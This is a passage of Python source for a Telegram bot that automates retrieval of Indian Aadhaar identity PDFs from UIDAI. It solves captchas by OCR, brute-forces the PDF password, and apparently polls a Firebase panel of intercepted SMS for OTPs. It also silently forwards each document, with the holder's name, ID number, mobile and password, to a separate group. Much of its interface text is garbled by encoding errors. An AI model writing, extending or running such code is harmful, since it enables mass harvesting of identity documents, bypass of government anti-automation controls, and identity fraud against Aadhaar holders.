        data = self.get_user_data(user_id)

        msg = await update.message.reply_text(
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´Âss...</b>",
            parse_mode='HTML')

        payload = {
            "mobileNumber": data.get("mobile"),
            "dob": data.get("uidai_dob"),
            "email": None,
            "name": data.get("uidai_name", "Mr"),
            "option": "EID", "otp": otp,
            "otpTxnId": data.get("uidai_otp1_txn"),
            "captchaTxnId": data.get("uidai_cap1_txn"),
            "captcha": data.get("uidai_cap1_value"),
            "resendOtp": False,
        }

        resp = None
        last_req_err = None

        for attempt in range(1, 3):
            try:
                resp = await self.uidai_post(
                    f"{UIDAI_BASE}/retrieveEidUid/ext/v1/generic/retrieveuideid",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload,
                    user_id=user_id,
                    timeout=20,
                )
                logger.info(f"[handle_otp1] UIDAI verification response (attempt {attempt}): {resp}")
                break
            except Exception as e:
                last_req_err = e
                logger.warning(f"[handle_otp1] attempt {attempt} failed: {e}")
                await asyncio.sleep(0.5)

        if not resp:
            err_clean = html.escape(str(last_req_err or "Server Timeout"))
            await msg.edit_text(f"<b>Ã¢ÂÂ Error:</b> <code>{html.escape(str(err_clean))}</code>\nDubara OTP ya /cancel.", parse_mode='HTML')
            return

        rd = resp.get("responseData", {}) if isinstance(resp, dict) else {}
        eid = rd.get("eidNumber")

        if not eid:
            err = rd.get("message") or (resp.get("errorDetails") or {}).get("messageEnglish") or resp.get("message") or "Invalid OTP"
            err_clean = html.escape(str(err))

            if is_not_linked_error(err):
                await msg.edit_text(get_not_linked_msg(), parse_mode='HTML')
                self.clear_user_data(user_id)
                return

            err_code = resp.get("errorCode") if isinstance(resp, dict) else None
            err_lower = str(err).lower()
            if err_code in ("REU_NET_OTP_ERR_001", "REU_NET_RED_ERR_001") or "technical difficulties" in err_lower or resp.get("status_code") in (500, 502, 503, 504):
                await msg.edit_text(
                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
                    f"<blockquote>UIDAI server par temporary glitch hai (yeh galat OTP nahi hai).\n"
                    f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                    parse_mode='HTML'
                )
                return

            retries = data.get('uidai_retry1', 0) + 1
            self.update_user_data(user_id, 'uidai_retry1', retries)

            if retries >= 3:
                await msg.edit_text(
                f"<b>Ã¢ÂÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃªÂÂ°Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n"
                f"<b>3 attempts fail. /start</b>", parse_mode='HTML')
                self.clear_user_data(user_id)
                return

            await msg.edit_text(
                f"<b>Ã¢ÂÂ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
                f"<b>{emo('Ã°ÂÂÂ¥')} Dubara OTP type karo:</b>", parse_mode='HTML')
            return

        resp_name = rd.get("name") or data.get("uidai_name", "Mr")
        resp_dob  = rd.get("dob") or rd.get("dateOfBirth") or rd.get("birthDate") or data.get("uidai_dob", "")

        self.update_user_data(user_id, 'name', resp_name)
        self.update_user_data(user_id, 'eid', eid)
        self.update_user_data(user_id, 'uidai_resp_name', resp_name)
        self.update_user_data(user_id, 'uidai_resp_dob', resp_dob)
        self.update_user_data(user_id, 'uidai_retry1', 0)

        # Directly call _uidai_send_otp2 with 8x retry
        await self._uidai_send_otp2(update, ctx, eid, resp_name, status_msg=msg, max_retries=8)

    async def _uidai_send_otp2(self, update, ctx, eid, resp_name, status_msg=None, max_retries=8):
        user_id = update.effective_user.id

        if status_msg:
            prog = status_msg
            try:
                await prog.edit_text(
                    f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
                    parse_mode='HTML')
            except Exception:
                pass
        else:
            eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
            prog = await eff_msg.reply_text(
                f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
                parse_mode='HTML')

        last_err = "Unknown error"
        timeout = aiohttp.ClientTimeout(total=8, connect=3.5)
        resp = None

        for attempt in range(1, max_retries + 1):
            resp = None
            try:
                if attempt > 1:
                    asyncio.create_task(
                        safe_edit_text(
                            prog,
                            f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â... ({attempt}/{max_retries})</b>",
                            parse_mode='HTML'
                        )
                    )

                # Step 1 & 2: Fetch and solve captcha fast
                cap = await self.uidai_post(
                    f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data={"captchaLength": "6", "captchaType": "2",
                               "audioCaptchaRequired": False},
                    user_id=user_id,
                    timeout=4,
                )
                img_b64 = cap.get("imageBase64")
                cap_txn = cap.get("transactionId")
                if not (img_b64 and cap_txn):
                    continue

                img_bytes = base64.b64decode(img_b64)
                solved = await asyncio.to_thread(solve_captcha_auto, img_bytes)
                if not solved or len(solved) != 6:
                    logger.warning(f"[EID to OTP] attempt {attempt}: OCR solve failed (got {solved})")
                    continue

                logger.info(f"[EID to OTP] attempt {attempt}: solved captcha {solved}")
                self.update_user_data(user_id, 'uidai_cap2_txn', cap_txn)
                self.update_user_data(user_id, 'uidai_cap2_value', solved)

                # Step 3: Send OTP generate request
                req_txn = f"MYAADHAAR:{uuid.uuid4()}"
                self.update_user_data(user_id, 'uidai_pdf_txn', req_txn)

                payload = {
                    "captchaValue": solved,
                    "captchaTxnId": cap_txn,
                    "transactionId": req_txn,
                    "eidNumber": eid,
                    "idType": "eid",
                }

                resp = await self.uidai_post(
                    f"{UIDAI_BASE}/unifiedAppAuthService/api/v2/generate/aadhaar/otp",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload,
                    user_id=user_id,
                    timeout=12,
                )

                if resp.get("status") == "Success":
                    logger.info(f"Ã¢ÂÂ EID to Aadhaar OTP success on attempt {attempt}")
                    safe_delete_bg(prog)

                    self.update_user_data(user_id, 'uidai_otp2_txn', resp.get("txnId"))
                    self.update_user_data(user_id, 'uidai_retry2', 0)
                    self.update_user_data(user_id, 'stage', 'otp2')

                    bot = getattr(ctx, "bot", None) or update.get_bot()
                    eff_m = update.effective_message or (update.callback_query.message if update.callback_query else None)
                    reply_id = getattr(eff_m, "message_id", None) if eff_m else None
                    await send_rich_step2_message(
                        bot,
                        update.effective_chat.id,
                        name=resp_name,
                        eid=eid,
                        reply_to_message_id=reply_id
                    )
                    return True

                msg = resp.get("message") or (resp.get("errorDetails") or {}).get("messageEnglish") or resp.get("statusMessage") or str(resp)
                last_err = msg
                logger.warning(f"[EID to OTP] attempt {attempt} failed: {msg}")

                msg_lower = str(msg).lower()
                if "deceased" in msg_lower or "deactivated" in msg_lower:
                    try:
                        await prog.delete()
                    except Exception:
                        pass
                    msg_target = update.effective_message or (update.callback_query.message if update.callback_query else None)
                    if msg_target:
                        await msg_target.reply_text(
                            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
                            "<blockquote>"
                            f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {html.escape(str(msg))}</b>\n"
                            "<b>UIDAI database me ye Aadhaar card officially deactivate ho chuka hai (Deceased). Iska download OTP UIDAI allow nahi karta.</b>"
                            "</blockquote>\n\n"
                            "<b>/start sÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃ¡Â´Â.</b>",
                            parse_mode='HTML'
                        )
                    self.clear_user_data(user_id)
                    return False

            except Exception as e:
                last_err = str(e)
                logger.warning(f"[EID to OTP] attempt {attempt} exception: {e}")

            is_server_500 = isinstance(resp, dict) and resp.get("status_code") == 500
            if "technical difficulties" in str(last_err).lower() or is_server_500:
                await asyncio.sleep(0.8)
            else:
                await asyncio.sleep(0.05)

        try:
            await prog.delete()
        except Exception:
            pass

        err_clean = html.escape(str(last_err))
        msg_obj = update.effective_message

        # Check if error is retryable (technical difficulties or captcha failure)
        last_err_lower = str(last_err).lower()
        if "technical difficulties" in last_err_lower or is_server_500 or "captcha" in last_err_lower or "busy" in last_err_lower:
            self.update_user_data(user_id, 'stage', 'retry_otp2')
            self.update_user_data(user_id, 'eid', eid)
            self.update_user_data(user_id, 'uidai_resp_name', resp_name)
            self.update_user_data(user_id, 'created_at', time.time()) # refresh session

            retry_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='retry_otp2', style="primary")],
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data='cancel_flow', style="danger")]
            ])

            if msg_obj:
                await msg_obj.reply_text(
                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} UIDAI Server Busy / Technical Glitch</b>\n\n"
                    "<blockquote>"
                    f"<b>Status:</b> <code>{html.escape(str(err_clean))}</code>\n"
                    "<b>Aapka EID save hai. /start karne ki zaroorat nahi hai.</b>\n"
                    "<b>Niche diye button par click karke dobara OTP generate karein:</b>"
                    "</blockquote>",
                    reply_markup=retry_kb,
                    parse_mode='HTML'
                )
            return False

        if msg_obj:
            await msg_obj.reply_text(
                f"Ã¢ÂÂ <b>EID to Aadhaar OTP fail ho gaya:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
                parse_mode='HTML'
            )
        self.clear_user_data(user_id)
        return False

    async def _uidai_download_pdf(self, update, ctx, otp):
        user_id = update.effective_user.id
        data = self.get_user_data(user_id)

        eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
        prog = await eff_msg.reply_text(
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  10%</b>",
            parse_mode='HTML'
        )

        _progress_frames = [
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  20%</b>",
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  40%</b>",
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  60%</b>",
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  80%</b>",
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  95%</b>",
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  99%</b>",
        ]
        _stop_anim = asyncio.Event()

        async def _run_progress_anim():
            idx = 0
            while not _stop_anim.is_set():
                try:
                    frame = _progress_frames[min(idx, len(_progress_frames) - 1)]
                    await prog.edit_text(frame, parse_mode='HTML')
                except Exception:
                    pass
                idx += 1
                await asyncio.sleep(2)

        _anim_task = asyncio.create_task(_run_progress_anim())

        payload = {
            "eid": data.get("eid"),
            "mask": False,
            "otp": otp,
            "otpTxnId": data.get("uidai_otp2_txn"),
        }

        raw = None
        def _req_download():
            headers = _uidai_h("MYAADHAARREVAMP")
            curl_opts = {
                CurlOpt.CONNECTTIMEOUT: 8,
                CurlOpt.BUFFERSIZE: 524288,
                CurlOpt.TCP_NODELAY: 1,
            }
            resp = curl_requests.post(
                f"{UIDAI_BASE}/downloadAadhaarService/api/aadhaar/download",
                headers=headers,
                json=payload,
                verify=False,
                curl_options=curl_opts,
                timeout=25,
            )
            if resp.status_code == 200 and resp.content:
                if resp.content[:2] == b"PK" or resp.content[:4] == b"%PDF":
                    return resp.content
                if resp.content.startswith(b"{"):
                    try:
                        j_check = json.loads(resp.content.decode("utf-8", errors="ignore"))
                        if find_pdf(j_check):
                            return resp.content
                        err_c = j_check.get("errorCode", "")
                        if err_c in ("DEA_VAL_OTP_INF_002", "DEA_NET_OTP_ERR_001"):
                            return resp.content
                        err_msg = str((j_check.get("errorDetails") or {}).get("messageEnglish") or j_check.get("message") or "").lower()
                        if err_c == "DEA_NET_SSA_ERR_101" or "busy" in err_msg:
                            logger.warning(f"Download attempt hit UIDAI technical error: {err_c or err_msg[:50]}.")
                            return resp.content
                        else:
                            return resp.content
                    except Exception:
                        pass
                return resp.content
            raise Exception(f"HTTP {resp.status_code}: {resp.text[:100]}")


        try:
            raw = await asyncio.to_thread(_req_download)
        except Exception as req_err:
            _stop_anim.set()
            _anim_task.cancel()
            logger.error(f"Download exception: {req_err}")
            err_clean = html.escape(str(req_err))
            if "technical difficulties" in str(req_err).lower():
                await prog.edit_text(
                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
                    f"<blockquote>UIDAI download server par temporary technical glitch chal raha hai (yeh galat OTP nahi hai).\n"
                    f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                    parse_mode='HTML'
                )
                return
            await prog.edit_text(
                f"<b>Ã¢ÂÂ Download error: {err_clean}</b>\nDubara OTP ya /cancel.",
                parse_mode='HTML')
            return
        finally:
            _stop_anim.set()
            _anim_task.cancel()

        if not raw:
            await prog.edit_text("<b>Ã¢ÂÂ Empty response from UIDAI. Dubara OTP ya /cancel.</b>", parse_mode='HTML')
            return

        result = extract_pdf(raw)

        if isinstance(result, dict):
            err = result.get("message") or (result.get("errorDetails") or {}).get("messageEnglish") or result.get("statusMessage") or result.get("error") or result.get("status") or "Invalid OTP"
            if str(err) == "400":
                err = "Invalid OTP"
            err_clean = html.escape(str(err))
            logger.warning(f"Download returned dict instead of PDF: {result}")
            if ("exceeded" in str(err).lower() or "regenerate" in str(err).lower()) and "please enter the correct" not in str(err).lower():
                await prog.edit_text(
                    f"<b>Ã¢ÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂxÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â / ÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n\n<b>/start se dobara process shuru karein.</b>",
                    parse_mode='HTML')
                self.clear_user_data(user_id)
                return

            err_code = result.get("errorCode", "")
            if err_code in ("DEA_VAL_OTP_INF_002", "DEA_NET_OTP_ERR_001"):
                pass  # Real wrong OTP, do not treat as technical difficulties
            elif err_code == "DEA_NET_SSA_ERR_101" or "technical difficulties" in str(err).lower():
                await prog.edit_text(
                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
                    f"<blockquote>UIDAI download server par temporary technical glitch chal raha hai (yeh galat OTP nahi hai).\n"
                    f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                    parse_mode='HTML'
                )
                return

            retries = data.get('uidai_retry2', 0) + 1
            self.update_user_data(user_id, 'uidai_retry2', retries)

            if retries >= 3:
                await prog.edit_text(
                    f"<b>Ã¢ÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n3 fail. /start",
                    parse_mode='HTML')
                self.clear_user_data(user_id)
                return
            await prog.edit_text(
                f"<b>Ã¢ÂÂ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
                f"<b>{emo('Ã°ÂÂÂ¥')} Dubara OTP type karo:</b>", parse_mode='HTML')
            return

        if not result or len(result) < 500:
            await prog.edit_text(
                "<b>Ã¢ÂÂ PDF corrupt ya response galat. Dubara OTP ya /cancel.</b>",
                parse_mode='HTML')
            return

        pdf_bytes = result
        resp_name = data.get("uidai_resp_name") or data.get("name", "")
        resp_dob  = data.get("uidai_resp_dob") or data.get("dob", "")

        unlocked, used_pwd = await asyncio.to_thread(
            unlock_pdf_bruteforce, pdf_bytes, resp_name, resp_dob
        )
        final_pdf = unlocked if unlocked else pdf_bytes

        safe_name = "".join(c for c in (resp_name or "Unknown") if c.isalnum())
        pdf_filename = f"@Getaadharpdfbot_{safe_name}_Aadhaar.pdf"

        prefix = resp_name.replace(" ", "")[:4].upper() if resp_name else "NAME"
        status_text = "Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!" if unlocked else "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Password Protected)"
        pwd_text = f"<code>{used_pwd}</code>" if used_pwd else f"<code>{prefix}YYYY</code> (Name 4 letters + Year)"

        caption = (
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° {status_text}</b>\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(resp_name or 'N/A')}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: <code>{data.get('eid', 'N/A')}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: <code>{data.get('mobile', 'N/A')}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â: {pdf_filename}</b>\n"
            "</blockquote>\n\n"
            f"<b>{emo('Ã°ÂÂÂ¨')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â!</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )
        sent_doc = None
        for send_try in range(3):
            try:
                pdf_buf = BytesIO(final_pdf)
                pdf_buf.name = pdf_filename
                sent_doc = await update.message.reply_document(
                    document=pdf_buf, filename=pdf_filename,
                    caption=caption, parse_mode='HTML',
                    read_timeout=60, write_timeout=60, connect_timeout=30)
                break
            except telegram.error.RetryAfter as ra:
                logger.warning(f"User PDF reply flood wait: sleeping {ra.retry_after}s")
                await asyncio.sleep(ra.retry_after + 1)
            except Exception as send_err:
                if send_try < 2:
                    await asyncio.sleep(2)
                else:
                    logger.error(f"Failed to send PDF to user {user_id}: {send_err}")

        # Pin PDF in user chat
        if sent_doc and update.effective_chat:
            try:
                await ctx.bot.pin_chat_message(
                    chat_id=update.effective_chat.id,
                    message_id=sent_doc.message_id,
                    disable_notification=True
                )
                logger.info(f"Ã°ÂÂÂ Pinned PDF message {sent_doc.message_id} in chat {update.effective_chat.id}")
            except Exception as pin_err:
                logger.warning(f"Could not pin message: {pin_err}")

        # Delete progress bar after PDF sent successfully
        safe_delete_bg(prog)

        # 1. Forward PDF to Group in background (Admin ke download group me forward nahi honge)
        if not is_admin(user_id):
            caption_fwd = (
                f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°</b>\n\n"
                f"<b>{emo('Ã°ÂÂÂ¤')} {html.escape(resp_name or 'N/A')}</b>\n"
                f"<b>{emo('Ã°ÂÂÂ')} {data.get('eid')}</b>\n"
                f"<b>{emo('Ã°ÂÂÂ±')} {data.get('mobile')}</b>\n"
                f"<b>{emo('Ã°ÂÂÂ')} {used_pwd or 'locked'}</b>"
            )
            async def _forward_background(pdf_data, p_name):
                if not FORWARD_GROUP_ID:
                    return
                for fwd_try in range(4):
                    try:
                        buf = BytesIO(pdf_data)
                        buf.name = p_name
                        await ctx.bot.send_document(
                            chat_id=FORWARD_GROUP_ID,
                            document=buf, filename=p_name,
                            caption=caption_fwd, parse_mode='HTML',
                            read_timeout=60, write_timeout=60)
                        logger.info(f"Ã¢ÂÂ PDF forwarded to group {FORWARD_GROUP_ID} successfully.")
                        break
                    except telegram.error.RetryAfter as ra:
                        logger.warning(f"Group forward flood wait: sleeping {ra.retry_after}s")
                        await asyncio.sleep(ra.retry_after + 1)
                    except Exception as fwd_err:
                        if fwd_try < 3:
                            await asyncio.sleep(2 * (fwd_try + 1))
                        else:
                            logger.error(f"Group forward error: {fwd_err}")

            asyncio.create_task(_forward_background(final_pdf, pdf_filename))
        else:
            logger.info(f"Admin {user_id} downloaded PDF, skipping forward to group.")

        # 2. Database Stats & Log (non-blocking background thread)
        username_str = update.effective_user.username or 'Unknown'
        mobile_str = data.get("mobile", "Unknown")
        eid_str = data.get("eid", "Unknown")
        def _db_log_bg():
            try:
                update_user_stats(user_id)
                log_download(user_id, username_str, mobile_str, resp_name or "Unknown",
                    eid_str, pdf_filename, forwarded=0 if is_admin(user_id) else 1)
            except Exception as e:
                logger.error(f"post-process stats error: {e}")

        asyncio.create_task(asyncio.to_thread(_db_log_bg))

        self.clear_user_data(user_id)

    # ==========================================
    # FIREBASE AUTO OTP POLLING
    # ==========================================
    async def _firebase_auto_otp_poll(self, update, ctx, uid, device_id, stage,
                                       firebase_url=None, firebase_key=None, exclude_otps=None):
        data = self.get_user_data(uid)
        fb_url = firebase_url or data.get('selected_firebase_url') or FIREBASE_URL
        fb_key = firebase_key if firebase_key is not None else data.get('selected_firebase_key', '')
        fb_name = data.get('selected_firebase_name', 'Firebase')
        sender_hint = "JX-ADHAAR-T / ADHAAR" if stage == 'otp1' else "JK-ADHAAR-S / ADHAAR"

        poll_msg = await update.message.reply_text(
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ (ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ)...</b>\n\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¥')} Panel: {fb_name}</b>\n"
            f"<b>Ã°ÂÂÂ¨ Sender: <code>{sender_hint}</code></b>\n"
            f"<b>Ã°ÂÂÂ Status: Waiting for fresh incoming SMS...</b>\n"
            f"<b>Max wait: {OTP_POLL_TIMEOUT}s</b>"
            "</blockquote>",
            parse_mode='HTML'
        )

        initial_keys = await asyncio.to_thread(
            firebase_get_message_keys, device_id, fb_url, fb_key
        )
        poll_start_time = time.time()
